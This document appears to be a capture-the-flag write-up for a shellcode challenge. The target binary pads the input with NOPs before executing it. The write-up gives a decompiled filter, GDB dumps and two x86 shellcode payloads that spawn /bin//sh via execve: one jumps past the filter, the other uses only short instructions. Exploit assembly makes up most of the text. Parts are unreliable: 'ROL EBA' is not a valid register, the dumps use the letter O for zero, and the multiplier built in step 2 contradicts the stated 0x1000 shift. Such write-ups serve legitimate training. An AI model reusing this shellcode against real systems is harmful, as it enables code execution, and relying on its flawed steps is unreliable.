# Filtered Shellcode Binary Exploitation CTF

## Overview
This challenge involves crafting shellcode under a restrictive transformation. The target binary reads shellcode from STDIN, modifies it by inserting padding bytes, and then executes the result.

The goal is crafting shellcode that will work after the transformation.

## Binary Analysis
The challenge provides a binary, ```fun```, and a specific glibc version.

Decompilation in Ghidra reveals the following challenge function.

```c
void execute(uint8_t *buffer,int buffer_length) {

  if ((buffer != 0) && (buffer_length != 0)) {
    twice_buffer_length = buffer_length * 2;
    padded_buffer_length = ((twice_buffer_length + 0x10) / 0x10) * 0x10;
    j = 0;
    for (int i = 0; i < twice_buffer_length; i = i + 1) {
      if (i % 4 < 2) {
        filtered_shellcode[i] = buffer[j];
        j = j + 1;
      }
      else {
        filtered_shellcode[i] = 0x90;
      }
    }
    filtered_shellcode[twice_buffer_length] = 0xc3;
    (*(code *)(filtered_shellcode))();
    return;
  }
}
```

The filter modifies user supplied shellcode by inserting two ```NOP``` instructions between two bytes of shellcode.  To complete
the challenge a valid shellcode must be built usting just one/two byte instructions.

## Verification

Dumping the filtered shellcode with GDB confirms the hypothesis.

```
Give me code to run: AAAAAAAAA

(gdb) x/128bx $eip
Oxffffc9e0: 0x41 0x41 0x90 0x90 0x41 0x41 0x90 0x90
Oxffffc9e8: 0x41 0x41 0x90 0x90 0x41 0x41 0x90 0x90
Oxffffc9f0: 0x41 0x90 0x90 0x90 0xc3 0x40 Oxdf 0xf7
...
0xffffca40: 0x00 0x14 Oxfc 0x41 0x41 0x41 0x41 0x41
Oxffffca48: 0x41 0x41 0x41 0x41 0x90 0x6d Oxfd 0xf7
...
```

It also shows that the filtered shellcode at address ```Oxffffc9e0``` is relatively close to the unfiltered shellcode at ```0xffffca44```.


## Alternate Solution
The filter can be completely bypassed by jumping into the unfiltered shellcode.  With two-byte opcodes a short relative jump of up
to 127 bytes is possible.  At the start of the filtered shellcode ```EAX```, ```EBX```, ```ECX```, and ```EDX``` all contain the address
of the filtered shellcode.  It would also be trivial to point one of the registers to the start of the unfiltered shelllcode and perform an
absolute jump.

This example uses two relative jumps instead of an absolute jump.  Calculating the distances was done using GDB, so explotation relies on the
target having the same relative memory layout.  This approach results in a much smaller payload.

```asm
JMP short $+0x38	; Jump to the end of the filtered shellcode

XOR EAX, EAX		
PUSH EAX
PUSH ESP
POP ECX
MOV EDX, ECX
PUSH 0x68732f2f
PUSH 0x6e69622f
PUSH ESP
POP EBX
MOV EAX, 0x0b
INT 0x80

JMP short $+0x4d	; Jump into the unfiltered shellcode
```


## Intended Solution
The intended solution is to execute a shell using only one/two byte long instructions.  To push /bin//sh onto the stack it is necessary to load the data
into a register, such as EAX, one byte at a time with AL and AH.  The data can be shifted from AX to the upper bytes of EAX using repeated ```ROL EBA``` or
one ```MUL EBX``` with ```EBX = 0x1000```.  The only other consideration is maintining 2-byte alignment with NOP instructions.

1. Initialize registers with EAX set to zero and ECX/EDX pointing to null bytes.
```asm
XOR EAX, EAX
PUSH EAX
PUSH ESP
POP EDX
MOV ECX, EDX
NOP

```
2. Load the value 0x1000 into EBX to shift the the lower bytes of EAX up
```asm
XOR EBX, EBX
MOV BH, 0x10
MOV AH, 0x10
MUL EBX
MOV EBX, EAX
```
3. Load 0x68732f2f into EAX using EBX to shift EAX left with a two-byte equivalent of ```MUL EAX, 0x1000```
```asm
MOV AH, 0x68
MOV AL, 0x73
MUL EBX

MOV AH, 0x2f
MOV AL, 0x2f
PUSH EAX
NOP
```
4. load 0x6e69622f into EAX using EBX to shift the values left
```asm
MOV AH, 0x6e
MOV AL, 0x69
MUL EBX

MOV AH, 0x62
MOV AL, 0x2f
PUSH EAX
NOP
```
5. Point EBX to the /bin//sh string and call exeve("/bin//sh", 0x0, 0x0)
```asm
PUSH ESP
POP EBX
XOR EAX, EAX
MOV AL, 0x0b
INT 0x80
```